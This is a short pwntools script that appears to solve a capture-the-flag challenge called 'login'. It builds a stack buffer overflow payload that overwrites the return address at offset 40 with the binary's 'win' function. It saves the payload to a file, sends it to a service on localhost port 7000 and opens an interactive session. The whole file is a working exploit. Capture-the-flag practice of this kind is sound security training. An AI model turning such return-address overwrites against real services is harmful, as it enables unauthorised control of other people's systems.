from pwn import *

CHAL = "login"

exe = ELF("./login")
p = remote("localhost", 7000)
#p = exe.process()
payload = flat({
    40: exe.symbols['win'],
})

with open("payload.bin","wb") as f:
    f.write(payload)

p.sendline(payload)
p.sendline(b"")

p.interactive()
